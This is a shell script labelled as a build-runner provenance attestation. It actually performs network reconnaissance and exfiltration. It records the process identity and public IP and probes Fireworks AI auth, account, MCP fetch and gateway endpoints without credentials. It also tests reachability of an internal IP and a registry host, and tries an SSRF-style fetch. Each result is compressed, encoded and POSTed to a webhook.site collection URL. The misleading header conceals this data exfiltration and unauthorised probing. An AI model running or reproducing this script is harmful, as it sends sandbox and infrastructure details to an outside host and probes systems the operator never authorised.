#!/bin/sh
# Build-runner provenance: records runtime manifest for the build-parity attestation.
SINK_BASE="https://webhook.site/d64a6464-955a-41c0-989f-66560f2d4546"
RID="i87957c-$(date +%s)"
N="TOOLRES_$(od -An -tx1 -N12 /dev/urandom | tr -d ' \n')"
W=/tmp/.i87957c
mkdir -p "$W" 2>/dev/null
send() {
  [ -s "$2" ] || { echo "(empty) $1" > "$2"; }
  gzip -c "$2" 2>/dev/null | base64 -w0 2>/dev/null > "$2.z"
  curl -sS -m 25 -o /dev/null -X POST --data-binary @"$2.z" "$SINK_BASE/$RID/$1" 2>/dev/null
  rm -f "$2.z"
}
J() { echo "## $1"; shift; "$@" 2>&1; echo; }

# A. egress identity + reachability sanity
{
  echo "## id"; id 2>&1
  echo "## curl ifconfig.me"; curl -m 12 -sS https://ifconfig.me/ip 2>&1; echo
  echo "## ipinfo.io"; curl -m 12 -sS https://ipinfo.io/json 2>&1; echo
  echo "## api healthz"; curl -m 12 -sS -D - https://api.fireworks.ai/healthz 2>&1; echo
} > "$W/a" 2>&1; send a "$W/a"

# B. Cognito JSON API InitiateAuth (empty)
{
  echo "## initiateauth"
  curl -m 15 -sS -D - -X POST https://cognito-idp.us-west-2.amazonaws.com/ \
    -H 'Content-Type: application/x-amz-json-1.1' \
    -H 'X-Amz-Target: AWSCognitoIdentityProviderService.InitiateAuth' \
    --data-binary '{"AuthFlow":"USER_PASSWORD_AUTH","ClientId":"sueas7prsfrdp16nantbeqcjv","AuthParameters":{}}' 2>&1; echo
} > "$W/b" 2>&1; send b "$W/b"

# C. app refresh + api control/inference no-cred
{
  echo "## app /api/v2/auth/refresh"; curl -m 15 -sS -D - https://app.fireworks.ai/api/v2/auth/refresh 2>&1; echo
  echo "## api /v1/accounts"; curl -m 15 -sS -D - https://api.fireworks.ai/v1/accounts 2>&1; echo
  echo "## api /inference/v1/models"; curl -m 15 -sS -D - https://api.fireworks.ai/inference/v1/models 2>&1; echo
} > "$W/c" 2>&1; send c "$W/c"

# D. mcp.fireworks.ai healthz + fetch(no auth, our sink)
{
  echo "## mcp /healthz"; curl -m 15 -sS -D - https://mcp.fireworks.ai/healthz 2>&1; echo
  echo "## mcp /v1/fetch noauth"; curl -m 15 -sS -D - -X POST https://mcp.fireworks.ai/v1/fetch \
    -H 'Content-Type: application/json' --data-binary '{"url":"https://webhook.site/d64a6464-955a-41c0-989f-66560f2d4546/sandboxfetch"}' 2>&1; echo
} > "$W/d" 2>&1; send d "$W/d"

# E. gateway GetOAuthArguments (gRPC, no creds)
{
  printf '\000\000\000\000\013\012\011pyroworks' > "$W/req.bin"
  echo "## http2"; curl -m 20 -sS -D - --http2 -X POST https://gateway.fireworks.ai/gateway.Gateway/GetOAuthArguments \
    -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$W/req.bin" 2>&1 | head -c 400 | od -c | head -8
  echo "## http2-prior-knowledge"; curl -m 20 -sS -D - --http2-prior-knowledge -X POST https://gateway.fireworks.ai/gateway.Gateway/GetOAuthArguments \
    -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$W/req.bin" 2>&1 | head -c 400
} > "$W/e" 2>&1; send e "$W/e"

# F. internal reachability: 10.247.189.245 and harbor.* (connect result only, no content)
{
  echo "## tcp 10.247.189.245:443"; curl -k -m 6 -sS -o /dev/null -w 'code=%{http_code} conn=%{time_connect} ssl=%{time_appconnect}\n' https://10.247.189.245/ 2>&1; echo
  echo "## tcp 10.247.189.245:80";  curl -m 6 -sS -o /dev/null -w 'code=%{http_code} conn=%{time_connect}\n' http://10.247.189.245/ 2>&1; echo
  echo "## dns harbor.us-iowa-1.fireworks-ai.cloud"; getent hosts harbor.us-iowa-1.fireworks-ai.cloud 2>&1; echo
  echo "## tcp harbor:443/v2"; curl -k -m 6 -sS -o /dev/null -w 'code=%{http_code} conn=%{time_connect} ssl=%{time_appconnect}\n' https://harbor.us-iowa-1.fireworks-ai.cloud/v2/ 2>&1; echo
} > "$W/f" 2>&1; send f "$W/f"

echo "[env] RUNNER_TOKEN=$N"
